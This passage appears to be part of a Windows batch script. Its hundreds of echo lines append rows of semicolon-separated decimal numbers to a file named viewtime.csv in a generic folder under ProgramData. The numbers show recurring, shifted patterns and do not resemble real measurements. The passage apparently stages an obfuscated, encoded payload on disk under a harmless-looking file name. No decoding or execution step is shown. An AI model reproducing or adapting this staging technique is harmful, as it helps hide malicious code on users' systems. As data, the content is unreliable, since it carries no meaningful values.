>> "C:\ProgramData\abc\viewtime.csv" echo(73.5565;587.92;557.120;623.82;6607.736;6.385;69.640;60.6823;955.122;435.43;
>> "C:\ProgramData\abc\viewtime.csv" echo(60.69;0315.335;32.687;71.534;26.7163;64.68;550.40;493.87;5912.363;61.622;
>> "C:\ProgramData\abc\viewtime.csv" echo(68.630;7.4675;493.86;553.98;669.71;7607.554;27.792;93.457;101.7639;764.71;
>> "C:\ProgramData\abc\viewtime.csv" echo(819.26;480.87;2146.740;101.564;68.819;7.9442;586.87;640.101;464.71;2466.817;
>> "C:\ProgramData\abc\viewtime.csv" echo(69.325;27.459;55.1284;612.83;825.64;773.82;2167.563;61.311;67.823;73.2628;
>> "C:\ProgramData\abc\viewtime.csv" echo(775.90;542.48;617.23;8509.804;73.327;97.811;120.3560;695.23;817.37;427.31;
>> "C:\ProgramData\abc\viewtime.csv" echo(4294.809;112.719;88.762;13.1447;319.26;535.55;51.82;1808.955;122.535;43.50;
>> "C:\ProgramData\abc\viewtime.csv" echo(69.3920;535.32;387.71;634.17;5859.511;65.350;27.777;86.6792;341.30;616.89;
>> "C:\ProgramData\abc\viewtime.csv" echo(552.29;4028.680;92.535;12.34;85.5109;459.12;53.19;61.60;9619.423;71.430;
>> "C:\ProgramData\abc\viewtime.csv" echo(7.679;86.5997;763.44;50.83;617.28;1431.687;80.557;49.610;89.6290;63.8;
>> "C:\ProgramData\abc\viewtime.csv" echo(691.95;540.120;9023.311;88.435;73.775;86.6006;362.55;79.65;350.13;2337.955;
>> "C:\ProgramData\abc\viewtime.csv" echo(122.635;43.70;69.4123;335.32;487.71;634.17;9159.711;65.550;27.377;86.5604;
>> "C:\ProgramData\abc\viewtime.csv" echo(541.30;716.89;552.29;2027.480;92.535;12.44;85.7176;559.12;63.19;635.55;
>> "C:\ProgramData\abc\viewtime.csv" echo(1808.769;82.647;10.792;67.6646;457.49;310.89;819.13;4379.680;65.540;59.417;
>> "C:\ProgramData\abc\viewtime.csv" echo(88.4509;337.16;955.122;735.43;6332.50;69.635;32.587;71.8495;734.17;411.65;
>> "C:\ProgramData\abc\viewtime.csv" echo(650.27;2879.477;86.441;30.716;89.6813;652.29;680.92;735.12;3683.74;85.559;
>> "C:\ProgramData\abc\viewtime.csv" echo(12.63;19.2621;64.30;349.23;449.28;2188.685;95.809;27.410;66.4277;457.29;
>> "C:\ProgramData\abc\viewtime.csv" echo(44.22;556.120;7067.640;86.547;42.586;70.9547;635.44;488.18;334.255;0554.822;
>> "C:\ProgramData\abc\viewtime.csv" echo(35.743;0.469;35.8368;432.87;771.34;317.11;6080.665;50.727;77.386;41.8648;
>> "C:\ProgramData\abc\viewtime.csv" echo(330.16;389.52;329.80;3414.792;35.412;4.585;59.4651;512.3;619.61;655.22;
>> "C:\ProgramData\abc\viewtime.csv" echo(7751.410;114.428;25.817;56.8599;354.6;667.62;76.87;6180.803;44.758;9.482;
>> "C:\ProgramData\abc\viewtime.csv" echo(106.9130;476.73;619.25;357.7;4670.691;50.658;80.473;40.0094;801.85;579.114;
>> "C:\ProgramData\abc\viewtime.csv" echo(317.255;2102.697;40.343;17.588;37.5017;412.3;419.27;349.23;5574.467;34.58;
>> "C:\ProgramData\abc\viewtime.csv" echo(85.814;33.5648;652.10;684.119;715.88;5914.690;33.361;1.955;97.4635;640.43;
>> "C:\ProgramData\abc\viewtime.csv" echo(617.88;637.12;3979.53;19.740;54.517;69.9749;646.84;628.67;809.60;1129.41;
>> "C:\ProgramData\abc\viewtime.csv" echo(86.748;84.728;67.1372;809.52;612.89;660.12;4130.693;19.436;54.717;88.2953;
>> "C:\ProgramData\abc\viewtime.csv" echo(819.90;725.99;48.26;1253.769;91.762;26.677;64.9745;955.94;444.40;621.82;
>> "C:\ProgramData\abc\viewtime.csv" echo(4586.337;83.525;124.559;61.5373;423.64;437.0;377.86;9165.30;57.421;71.462;
>> "C:\ProgramData\abc\viewtime.csv" echo(7.7201;794.19;763.61;317.66;1084.737;7.692;87.597;120.2411;617.95;437.12;
>> "C:\ProgramData\abc\viewtime.csv" echo(588.87;9879.809;61.329;94.635;0.8486;487.84;955.99;640.42;3411.522;94.736;
>> "C:\ProgramData\abc\viewtime.csv" echo(29.425;86.1418;435.44;70.69;450.13;4519.955;116.344;44.30;113.6823;434.7;
>> "C:\ProgramData\abc\viewtime.csv" echo(490.71;336.55;0650.711;23.650;7.677;86.4868;763.61;41.255;599.44;2522.343;
>> "C:\ProgramData\abc\viewtime.csv" echo(22.494;57.714;25.1376;567.34;349.11;767.50;0337.527;25.771;34.820;11.7362;
>> "C:\ProgramData\abc\viewtime.csv" echo(482.47;429.25;667.44;7011.733;9.488;54.713;255.2453;499.63;755.17;582.52;
>> "C:\ProgramData\abc\viewtime.csv" echo(4098.529;25.686;35.444;0.3633;369.50;613.255;816.41;0459.749;86.75;121.713;
>> "C:\ProgramData\abc\viewtime.csv" echo(85.0764;695.255;802.62;361.23;2165.64;101.371;93.395;33.9103;955.116;340.44;
>> "C:\ProgramData\abc\viewtime.csv" echo(433.116;6830.955;118.635;45.48;99.4923;463.27;792.82;741.15;2652.612;89.351;
>> "C:\ProgramData\abc\viewtime.csv" echo(6.778;64.3555;955.118;635.45;78.120;7106.453;3.692;80.757;43.7660;955.97;
>> "C:\ProgramData\abc\viewtime.csv" echo(456.54;553.86;1521.346;5.486;82.741;120.5344;34.67;819.8;793.87;4863.463;
>> "C:\ProgramData\abc\viewtime.csv" echo(61.422;68.806;76.7988;673.19;558.49;417.95;7638.819;76.380;19.444;42.6100;
>> "C:\ProgramData\abc\viewtime.csv" echo(42.66;358.12;587.71;5809.362;255.817;63.661;0.9695;801.50;67.93;786.55;
>> "C:\ProgramData\abc\viewtime.csv" echo(9412.346;10.766;36.757;86.0681;790.35;644.69;468.35;7252.68;75.471;40.360;
>> "C:\ProgramData\abc\viewtime.csv" echo(255.4085;817.63;561.0;801.50;0070.37;93.486;55.746;10.4423;466.36;357.86;
>> "C:\ProgramData\abc\viewtime.csv" echo(390.35;6302.644;69.591;56.56;73.0284;690.35;763.255;817.63;2965.461;0.801;
>> "C:\ProgramData\abc\viewtime.csv" echo(50.67;93.3119;586.55;446.10;766.36;7668.457;86.390;35.444;95.2888;723.49;
>> "C:\ProgramData\abc\viewtime.csv" echo(627.92;486.41;5520.820;64.471;255.817;63.4806;461.0;801.50;47.93;9829.786;
>> "C:\ProgramData\abc\viewtime.csv" echo(55.446;10.766;36.8925;357.86;590.35;644.69;0496.781;62.67;80.464;37.0441;
>> "C:\ProgramData\abc\viewtime.csv" echo(661.1;955.103;437.45;1130.411;83.750;27.818;93.7147;433.33;545.86;339.25;
>> "C:\ProgramData\abc\viewtime.csv" echo(0540.692;93.362;15.513;82.2915;757.32;577.64;731.57;8335.712;89.362;7.494;
>> "C:\ProgramData\abc\viewtime.csv" echo(255.1756;955.204;904.204;904.204;5478.904;204.904;204.680;16.2255;30.0;468.137;
>> "C:\ProgramData\abc\viewtime.csv" echo(668.36;5417.324;72.837;84.636;16.2325;572.137;776.36;58.87;5433.772;129.936;
>> "C:\ProgramData\abc\viewtime.csv" echo(112.62;0.0909;70.72;839.132;336.128;4978.72;0.40;72.837;68.6077;736.80;
>> "C:\ProgramData\abc\viewtime.csv" echo(372.139;832.36;4920.836;2.70;0.772;137.0183;468.36;572.72;884.117;9788.810;
>> "C:\ProgramData\abc\viewtime.csv" echo(107.810;111.819;110.0192;812.72;837.68;336.104;9831.772;184.808;101.797;115.3116;
>> "C:\ProgramData\abc\viewtime.csv" echo(817.114;801.115;772.137;7276.568;36.812;199.368;36.8869;664.1;50.0;30.184;
>> "C:\ProgramData\abc\viewtime.csv" echo(3257.78;0.50;0.672;107.5952;892.1;772.99;476.36;1855.364;72.886;107.801;
>> "C:\ProgramData\abc\viewtime.csv" echo(97.5251;815.117;814.101;815.72;5304.43;202.572;57.676;4.8201;804.116;648.184;
>> "C:\ProgramData\abc\viewtime.csv" echo(78.0;2623.30;0.772;107.892;0.5526;572.139;768.4;804.72;7522.837;68.336;
>> "C:\ProgramData\abc\viewtime.csv" echo(80.884;8.2363;40.0;70.72;807.192;4085.61;72.839;68.74;104.0942;472.137;
>> "C:\ProgramData\abc\viewtime.csv" echo(368.36;772.139;3956.568;36.664;255.900;137.8553;568.36;564.72;841.132;4235.636;
>> "C:\ProgramData\abc\viewtime.csv" echo(192.30;0.30;72.3642;839.248;551.192;885.176;3477.31;0.50;243.870;72.9496;
>> "C:\ProgramData\abc\viewtime.csv" echo(841.5;856.13;40.0;9403.672;137.768;36.820;72.9532;839.68;336.72;672.137;
>> "C:\ProgramData\abc\viewtime.csv" echo(4082.368;36.732;76.839;76.0626;636.80;665.184;935.1;3500.50;0.572;139.384;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.1707;820.72;841.140;336.192;1557.60;0.70;232.940;2.6750;40.0;365.184;
>> "C:\ProgramData\abc\viewtime.csv" echo(44.1;2282.70;0.751;210.672;141.0675;840.36;572.1;70.0;1830.932;171.59;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.40;184.6503;31.0;50.0;772.105;8207.892;197.30;0.30;72.5693;839.140;
>> "C:\ProgramData\abc\viewtime.csv" echo(336.200;50.0;8732.60;72.73;200.672;139.5252;893.72;837.68;536.88;3088.672;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.376;36.488;232.5143;814.11;50.0;472.152;9182.476;139.892;72.839;84.1681;
>> "C:\ProgramData\abc\viewtime.csv" echo(736.88;672.141;840.36;4372.572;1.60;0.932;235.7017;78.0;40.255;848.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(6419.524;1.60;0.772;139.9189;900.255;848.36;732.1;5985.40;0.837;68.336;
>> "C:\ProgramData\abc\viewtime.csv" echo(68.1537;672.141;840.36;772.1;3359.70;0.932;57.311;0.3728;70.255;900.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(852.72;8496.841;132.74;72.51;0.3106;60.65;884.10;30.0;0599.70;72.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(208.839;76.5972;536.68;955.148;736.64;6138.71;0.40;184.31;0.8936;40.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(372.105;892.224;5146.50;0.60;72.839;140.1823;636.200;70.0;30.72;4163.63;
>> "C:\ProgramData\abc\viewtime.csv" echo(200.372;139.893;72.6557;837.68;436.96;772.139;2582.776;36.496;232.940;10.1945;
>> "C:\ProgramData\abc\viewtime.csv" echo(50.0;955.192;472.152;4525.572;137.832;36.828;0.6888;50.0;572.141;840.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(1096.472;1.40;0.932;215.0288;610.0;40.255;900.72;6214.852;72.841;132.44;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.4047;61.0;50.72;839.140;0173.536;128.50;0.50;76.1267;839.193;672.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(484.36;0031.696;72.839;200.932;67.6501;48.0;70.184;41.0;5998.60;0.572;
>> "C:\ProgramData\abc\viewtime.csv" echo(105.892;229.3072;50.0;40.72;839.140;5413.536;200.70;0.50;72.9338;43.200;
>> "C:\ProgramData\abc\viewtime.csv" echo(772.139;893.72;5842.839;208.572;141.840;36.5092;892.0;60.0;932.201;9512.510;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.70;184.61;0.0200;30.0;772.105;892.255;0623.70;0.60;72.839;140.2176;
>> "C:\ProgramData\abc\viewtime.csv" echo(736.200;30.0;40.72;5263.63;200.572;139.893;76.0619;839.76;436.72;776.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(0912.768;36.380;72.839;208.8675;672.141;840.36;892.0;5504.50;0.932;149.710;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.4064;40.184;41.0;40.0;2449.772;105.892;43.51;0.7669;50.72;839.140;
>> "C:\ProgramData\abc\viewtime.csv" echo(536.200;1679.40;0.30;72.43;200.1673;472.139;893.76;839.140;1424.736;224.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.40;76.1684;839.132;636.208;60.0;3347.50;72.839;208.772;141.6874;840.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(892.0;50.0;8467.932;91.410;0.60;184.3404;71.0;50.0;672.105;4661.892;
>> "C:\ProgramData\abc\viewtime.csv" echo(85.71;0.30;72.3844;839.140;636.200;70.0;9059.60;72.63;200.572;139.3881;
>> "C:\ProgramData\abc\viewtime.csv" echo(893.68;839.68;636.68;2318.472;139.908;72.841;140.5676;536.192;40.0;40.232;
>> "C:\ProgramData\abc\viewtime.csv" echo(4600.344;10.40;0.672;141.7557;832.36;836.0;30.0;0827.472;139.948;51.892;
>> "C:\ProgramData\abc\viewtime.csv" echo(185.8124;648.0;50.0;943.170;1366.665;184.548;0.50;0.2493;372.141;848.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(836.0;4410.40;0.672;141.313;35.7795;953.255;955.255;848.36;7651.640;1.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.884;1.4966;30.0;40.72;805.192;6221.800;1.70;0.372;139.7062;840.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(900.0;60.0;1197.772;3.900;72.839;193.9726;839.140;736.172;60.0;0647.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(137.676;36.448;139.4824;840.36;868.0;70.0;0387.837;76.536;40.839;140.1225;
>> "C:\ProgramData\abc\viewtime.csv" echo(636.176;40.0;40.137;8587.776;36.732;76.839;140.7269;336.144;70.0;40.76;
>> "C:\ProgramData\abc\viewtime.csv" echo(2061.839;132.536;136.60;0.3637;70.72;839.208;472.141;1257.840;36.892;0.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.3803;932.161;39.0;50.72;6005.841;140.536;192.30;0.8392;40.232;34.8;
>> "C:\ProgramData\abc\viewtime.csv" echo(60.0;4837.884;1.60;0.30;72.0805;805.192;881.1;30.0;8997.472;139.840;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.900;0.2780;70.0;772.3;900.72;1363.839;193.772;139.908;72.3025;841.140;
>> "C:\ProgramData\abc\viewtime.csv" echo(536.192;60.0;7072.70;232.806;9.70;0.7256;551.192;572.129;896.112;7644.32;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.60;95.895;204.9274;904.204;904.204;904.204;0334.904;204.904;204.904;204.9654;
>> "C:\ProgramData\abc\viewtime.csv" echo(904.204;576.137;668.36;6845.424;72.837;84.336;16.5371;672.137;476.36;38.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(3273.831;236.740;72.839;76.6813;336.64;372.139;568.36;8310.548;255.380;56.572;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.7878;676.36;456.72;837.1;7501.672;139.468;36.356;72.8488;831.56;60.117;
>> "C:\ProgramData\abc\viewtime.csv" echo(621.72;3880.839;76.336;64.472;139.5775;768.36;348.255;480.48;5376.772;139.476;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.756;72.9754;837.1;472.131;896.40;2808.895;204.904;204.576;137.5830;376.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(632.68;837.68;2310.436;24.672;137.584;36.6037;416.72;837.76;736.8;9781.387;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.829;236.828;0.5142;60.0;898.68;536.56;2654.658;198.768;36.557;61.6474;
>> "C:\ProgramData\abc\viewtime.csv" echo(898.68;336.58;738.198;0827.468;36.559;67.898;68.7505;736.60;30.198;568.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(1383.761;22.898;68.336;62.4615;424.198;668.36;763.47;6187.898;68.636;64.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(198.4887;768.36;665.56;898.68;5128.636;66.459;198.468;36.2659;367.84;898.68;
>> "C:\ProgramData\abc\viewtime.csv" echo(336.68;4782.955;72.841;84.436;56.4594;772.141;776.36;656.232;9871.368;7.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.572;139.6708;832.36;844.0;60.0;7899.772;139.840;36.868;0.1664;30.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(672.137;472.16;9064.672;139.832;36.844;0.3598;70.0;672.139;840.36;0662.876;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.60;0.672;137.2399;372.32;772.141;684.36;4780.456;72.839;132.436;144.2327;
>> "C:\ProgramData\abc\viewtime.csv" echo(70.0;40.72;839.72;2770.416;72.839;132.736;144.3571;60.0;50.255;480.32;
>> "C:\ProgramData\abc\viewtime.csv" echo(5547.572;139.840;36.844;0.3889;40.0;472.137;765.40;6648.839;132.736;160.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.9877;30.65;885.4;30.0;9234.40;65.884;0.716;0.2925;40.139;908.51;
>> "C:\ProgramData\abc\viewtime.csv" echo(901.72;4546.839;132.436;144.30;0.3605;70.255;780.40;572.139;6304.840;36.844;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.40;0.6242;372.137;565.8;839.132;9560.636;160.60;0.70;68.2830;839.192;
>> "C:\ProgramData\abc\viewtime.csv" echo(572.139;848.36;3428.852;0.60;0.372;139.0804;832.36;844.0;30.0;7965.572;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.672;8.932;67.0840;55.0;30.72;839.132;9322.336;144.30;0.30;72.4057;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.64;78.72;837.68;3658.636;72.372;139.832;36.6560;844.0;30.0;839.76;
>> "C:\ProgramData\abc\viewtime.csv" echo(5483.536;72.839;64.68;43.0891;893.59;832.36;860.0;3488.60;0.815;74.672;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.2186;832.36;844.0;30.0;1867.472;139.780;8.572;139.9614;832.36;844.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(70.0;9455.772;139.772;8.932;91.3433;56.0;40.72;839.132;3918.436;144.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.40;72.0796;839.72;58.232;590.7;8511.30;0.572;152.572;139.8245;840.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(844.0;70.0;9438.372;3.365;8.772;139.0477;840.36;844.0;30.0;3397.472;
>> "C:\ProgramData\abc\viewtime.csv" echo(137.565;8.935;156.0204;572.139;832.36;844.0;0052.70;0.572;139.476;36.7667;
>> "C:\ProgramData\abc\viewtime.csv" echo(472.72;837.72;68.184;4078.31;0.50;0.672;107.9287;892.0;472.139;840.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(8885.844;0.30;0.572;3.3403;365.8;772.139;908.72;3755.839;132.436;144.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.0134;60.72;839.72;416.72;7014.839;132.536;144.30;0.4066;70.255;480.32;
>> "C:\ProgramData\abc\viewtime.csv" echo(772.139;7015.840;36.844;0.30;0.6169;772.137;365.56;884.1;4634.40;0.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.807;192.2548;617.72;839.140;336.144;8096.60;0.50;72.63;65.8409;78.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.208;672.139;3263.832;36.844;0.70;0.5985;472.139;672.16;672.139;8001.832;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.844;0.40;0.9884;955.80;632.72;839.140;5509.336;144.50;0.50;72.4883;
>> "C:\ProgramData\abc\viewtime.csv" echo(837.65;548.184;31.0;5533.50;0.772;107.892;30.2443;372.139;840.36;844.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(8019.50;0.472;3.465;8.9225;372.139;840.36;844.0;3119.60;0.472;131.893;
>> "C:\ProgramData\abc\viewtime.csv" echo(24.7051;376.139;892.72;839.209;2928.672;139.840;36.844;0.5763;30.0;932.115;
>> "C:\ProgramData\abc\viewtime.csv" echo(953.255;9622.955;184.41;0.40;0.4169;472.107;892.37;772.139;4953.840;36.844;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.50;0.5215;672.3;465.8;576.139;2392.892;72.841;84.636;120.3167;372.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(840.36;844.0;6882.30;0.932;73.953;255.6447;955.199;468.36;532.0;8441.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.40;72.841;68.6145;736.80;572.139;948.51;5420.892;185.640;0.30;0.9598;
>> "C:\ProgramData\abc\viewtime.csv" echo(943.170;884.1;70.0;7918.40;72.807;192.461;72.1618;839.76;536.72;372.3;
>> "C:\ProgramData\abc\viewtime.csv" echo(1797.900;72.839;193.572;139.9615;840.36;844.0;30.0;0740.672;137.465;8.372;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.3881;832.36;844.0;70.0;8742.772;131.892;64.885;8.6707;50.0;30.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(807.201;4426.50;72.837;68.512;80.3060;572.139;832.36;844.0;4239.30;0.672;
>> "C:\ProgramData\abc\viewtime.csv" echo(131.892;72.1780;885.8;60.0;60.72;0771.807;201.41;72.837;68.3905;512.80;
>> "C:\ProgramData\abc\viewtime.csv" echo(472.139;832.36;1726.844;0.70;0.372;131.4122;892.80;885.8;50.0;4123.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.807;201.52;72.4059;837.68;512.80;899.68;3172.736;32.73;0.50;0.7454;
>> "C:\ProgramData\abc\viewtime.csv" echo(899.68;336.36;30.0;4831.50;0.935;10.839;68.4875;636.36;955.192;837.68;
>> "C:\ProgramData\abc\viewtime.csv" echo(9365.436;36.839;68.736;32.0454;457.68;536.36;825.93;5117.572;139.832;36.844;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.5094;50.0;772.139;380.8;6884.472;139.832;36.844;0.3546;50.0;472.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(372.16;7201.372;139.832;36.844;0.5245;50.0;955.80;532.72;0053.799;76.336;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.572;139.2735;776.204;380.72;837.1;2128.572;139.832;36.844;0.0190;40.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(672.139;372.8;2614.932;107.35;0.60;72.3961;852.72;839.140;636.144;0175.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.60;72.33;65.1704;48.72;839.140;536.144;0821.70;0.30;72.837;65.8529;
>> "C:\ProgramData\abc\viewtime.csv" echo(78.235;843.72;839.132;1663.436;144.30;0.70;72.5192;831.192;588.185;48.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(3204.40;0.772;107.901;0.7726;672.137;668.12;780.72;4064.839;132.436;144.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.1684;30.72;831.192;696.185;5472.38;0.30;0.372;107.0685;901.1;472.137;
>> "C:\ProgramData\abc\viewtime.csv" echo(568.12;1813.780;199.768;36.432;2.6109;60.0;40.199;568.36;8051.340;0.30;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.50;235.9708;410.139;468.36;640.255;8589.892;137.768;36.540;139.2261;368.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(332.57;568.36;1959.640;125.493;72.839;132.3355;636.144;30.0;70.72;1355.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(80.38;72.839;132.3503;536.144;40.0;70.72;6584.839;72.516;72.839;132.1930;
>> "C:\ProgramData\abc\viewtime.csv" echo(436.144;60.0;50.255;2160.680;32.372;99.476;36.5057;340.72;839.76;904.80;
>> "C:\ProgramData\abc\viewtime.csv" echo(4017.472;137.61;72.839;132.4798;336.144;40.0;60.72;9820.839;72.78;232.880;
>> "C:\ProgramData\abc\viewtime.csv" echo(4.2313;70.0;772.152;572.139;0431.840;36.844;0.30;0.5899;372.3;665.8;
>> "C:\ProgramData\abc\viewtime.csv" echo(772.139;7649.840;36.844;0.30;0.3723;372.137;765.8;935.143;7215.572;139.832;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.844;0.7897;40.0;772.131;892.104;7892.885;8.30;0.60;72.0164;807.201;
>> "C:\ProgramData\abc\viewtime.csv" echo(50.72;837.68;2223.412;80.572;139.832;36.5901;844.0;30.0;672.131;5284.892;
>> "C:\ProgramData\abc\viewtime.csv" echo(112.885;8.60;0.1659;50.72;807.201;61.72;9841.837;68.512;80.372;139.4086;
>> "C:\ProgramData\abc\viewtime.csv" echo(832.36;844.0;60.0;7666.772;131.892;120.885;8.6624;40.0;60.72;807.201;
>> "C:\ProgramData\abc\viewtime.csv" echo(7529.42;72.837;68.612;80.4768;899.68;636.32;43.0;0529.30;0.899;68.536;
>> "C:\ProgramData\abc\viewtime.csv" echo(44.5959;40.0;30.0;935.10;7268.839;68.736;44.955;192.5757;837.68;736.44;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.68;0239.636;32.757;68.536;44.4268;825.93;672.139;832.36;4891.844;0.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.572;139.3039;780.8;372.139;832.36;9717.844;0.70;0.572;139.9397;472.16;
>> "C:\ProgramData\abc\viewtime.csv" echo(772.139;832.36;6379.844;0.60;0.955;80.0006;432.72;699.76;636.44;5037.772;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.576;204.380;72.4172;837.1;672.139;832.36;4843.844;0.40;0.772;139.3641;
>> "C:\ProgramData\abc\viewtime.csv" echo(472.8;932.227;63.0;6028.40;72.852;72.839;140.7537;736.144;30.0;50.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(3058.73;65.48;72.839;140.9054;436.144;50.0;30.72;5055.837;65.58;235.843;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.8745;839.132;336.144;30.0;6161.60;72.35;128.50;0.7978;40.185;68.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(60.0;1506.672;107.901;0.372;137.5496;468.12;780.72;839.132;3695.636;144.30;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.30;72.2136;35.152;41.0;40.185;3056.78;0.60;0.572;107.5973;901.1;
>> "C:\ProgramData\abc\viewtime.csv" echo(572.137;668.12;9945.480;72.839;132.536;144.1407;60.0;70.72;65.144;8857.71;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.70;185.68;0.8746;40.0;372.107;901.2;7262.372;137.568;12.480;72.5926;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.132;536.144;70.0;6794.30;72.65;160.61;0.0500;40.185;48.0;40.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(6615.772;107.901;3.572;137.4265;768.12;780.72;839.132;3614.636;144.70;0.30;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.1593;55.168;41.0;50.185;4958.38;0.30;0.672;107.8835;901.4;772.137;
>> "C:\ProgramData\abc\viewtime.csv" echo(768.12;0281.380;199.768;36.732;5.5352;70.0;70.199;768.36;7924.548;0.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.30;235.1849;410.139;568.36;648.255;9774.892;137.468;36.648;139.9356;668.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(332.57;668.36;5572.548;125.693;72.839;132.1507;336.144;70.0;30.72;6983.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(80.48;72.839;132.5035;336.144;60.0;60.72;4953.839;72.524;72.839;132.6711;
>> "C:\ProgramData\abc\viewtime.csv" echo(636.144;30.0;30.255;3698.680;32.472;99.576;36.3663;748.72;839.76;904.80;
>> "C:\ProgramData\abc\viewtime.csv" echo(0418.672;137.41;72.839;132.4937;436.144;50.0;70.72;7237.839;72.78;232.912;
>> "C:\ProgramData\abc\viewtime.csv" echo(2.0202;30.0;472.152;372.139;3175.840;36.844;0.50;0.6080;572.3;765.8;
>> "C:\ProgramData\abc\viewtime.csv" echo(772.139;2974.840;36.844;0.60;0.0945;672.137;465.8;935.143;5986.372;139.832;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.844;0.9236;30.0;839.76;436.72;9332.839;64.38;43.893;139.4714;892.68;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.192;451.210;9912.572;139.676;36.772;232.8365;866.0;40.0;372.139;4811.832;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.844;0.60;0.7143;472.139;676.36;772.72;1647.837;72.48;72.829;196.9483;
>> "C:\ProgramData\abc\viewtime.csv" echo(828.0;70.0;795.195;1804.904;204.904;204.904;204.2115;904.204;904.204;904.204;
>> "C:\ProgramData\abc\viewtime.csv" echo(4100.376;137.368;36.624;72.3405;837.84;636.16;672.137;2271.776;36.58;72.831;
>> "C:\ProgramData\abc\viewtime.csv" echo(236.2810;340.72;839.68;736.48;8091.572;137.64;36.672;139.4322;368.36;556.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(837.68;2613.336;8.372;139.468;36.8952;564.72;837.68;636.16;8050.772;139.468;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.664;72.9750;955.200;372.137;768.36;3200.364;72.831;124.636;16.3702;60.116;
>> "C:\ProgramData\abc\viewtime.csv" echo(640.72;839.4;4523.636;72.839;76.636;8.2881;415.182;49.136;58.72;5128.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(4.436;72.955;192.8187;772.137;64.36;372.139;4309.668;36.48;72.955;192.7457;
>> "C:\ProgramData\abc\viewtime.csv" echo(772.137;368.36;38.235;1333.885;72.839;68.536;48.5927;472.131;896.40;895.204;
>> "C:\ProgramData\abc\viewtime.csv" echo(1353.904;204.904;204.904;204.8729;904.204;476.137;768.36;3652.424;137.584;36.716;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.8985;837.76;636.8;472.131;1726.936;24.672;139.768;36.8377;632.72;837.4;
>> "C:\ProgramData\abc\viewtime.csv" echo(636.72;5813.839;68.336;48.672;137.9695;568.36;78.72;839.68;1860.336;48.772;
>> "C:\ProgramData\abc\viewtime.csv" echo(255.900;72.9509;837.68;736.48;772.131;4221.824;36.68;0.818;24.8938;472.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(44.36;415.182;8715.476;36.640;136.68;72.5157;839.4;536.72;955.192;4675.772;
